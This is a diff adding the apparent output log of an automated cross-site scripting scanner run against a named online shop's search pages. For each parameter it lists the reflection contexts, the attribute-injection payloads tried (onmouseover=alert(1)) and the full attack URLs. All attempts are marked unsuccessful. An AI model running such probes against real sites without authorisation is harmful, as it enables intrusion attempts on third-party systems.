@@ -1,0 +1,298 @@
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search
+
+GET Params:[9]
+['inc_subcat', 'main_page', 'search_in_description', None, 'keyword', 'pfrom', 'pto', 'dfrom', 'dto']
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=index&inc_subcat=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=(uvw"xyz'yxz</zxy&search_in_description=0&keyword=Enter search keywords here
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=(uvw"xyz'yxz</zxy&keyword=Enter search keywords here
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=0&keyword=Enter search keywords here
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=0&keyword=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input type="text" name="keyword" size="18" maxlength="100" style="width: 145px" value="(uvw"xyz'yxz/zxy" onfocus="if (this.value == '(uvw"xyz'yxz/zxy') this.value = '';" onblur="if (this.value == '') this.value = '(uvw"xyz'yxz/zxy';" />
+<input type="text" name="keyword" value="(uvw&quot;xyz'yxz/zxy" placeholder="keywords" autofocus onfocus="RemoveFormatString(this, 'keywords')" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=0&keyword=" onmouseover="alert(1)
+
+ ______ UnSuccessful with payload: " onmouseover="alert(1)
+
+
+ATTR Attack Url: https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=0&keyword=' onmouseover='alert(1)
+
+ ______ UnSuccessful with payload: ' onmouseover='alert(1)
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=0&keyword=' onmouseover='alert(1)
+
+ ______ UnSuccessful with payload: ' onmouseover='alert(1)
+
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=(uvw"xyz'yxz</zxy&keyword=&pfrom=&pto=&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=(uvw"xyz'yxz</zxy&pfrom=&pto=&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input type="text" name="keyword" size="18" maxlength="100" style="width: 145px" value="(uvw"xyz'yxz/zxy" onfocus="if (this.value == '(uvw"xyz'yxz/zxy') this.value = '';" onblur="if (this.value == '') this.value = '(uvw"xyz'yxz/zxy';" />
+<input type="text" name="keyword" value="(uvw&quot;xyz'yxz/zxy" placeholder="keywords" autofocus onfocus="RemoveFormatString(this, 'keywords')" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=" onmouseover="alert(1)&pfrom=&pto=&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+ ______ UnSuccessful with payload: " onmouseover="alert(1)
+
+
+ATTR Attack Url: https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=' onmouseover='alert(1)&pfrom=&pto=&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+ ______ UnSuccessful with payload: ' onmouseover='alert(1)
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=' onmouseover='alert(1)&pfrom=&pto=&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+ ______ UnSuccessful with payload: ' onmouseover='alert(1)
+
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=&pfrom=(uvw"xyz'yxz</zxy&pto=&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input type="text" name="pfrom" value="uvwxyzyxz/zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=&pfrom=&pto=(uvw"xyz'yxz</zxy&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input type="text" name="pto" value="uvwxyzyxz/zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=&pfrom=&pto=&dfrom=(uvw"xyz'yxz</zxy&dto=mm/dd/yyyy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input type="text" name="dfrom" value="uvwxyzyxz/zxy" placeholder="mm/dd/yyyy" onfocus="RemoveFormatString(this, 'mm/dd/yyyy')" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=&pfrom=&pto=&dfrom=mm/dd/yyyy&dto=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input type="text" name="dto" value="uvwxyzyxz/zxy" placeholder="mm/dd/yyyy" onfocus="RemoveFormatString(this, 'mm/dd/yyyy')" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+_______________________________________________________________________________________________________
+https://www.monstersinmotion.com/cart/index.php?main_page=advanced_search_result&main_page=advanced_search_result&keyword=&pfrom=&pto=&dfrom=mm/dd/yyyy&dto=mm/dd/yyyy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
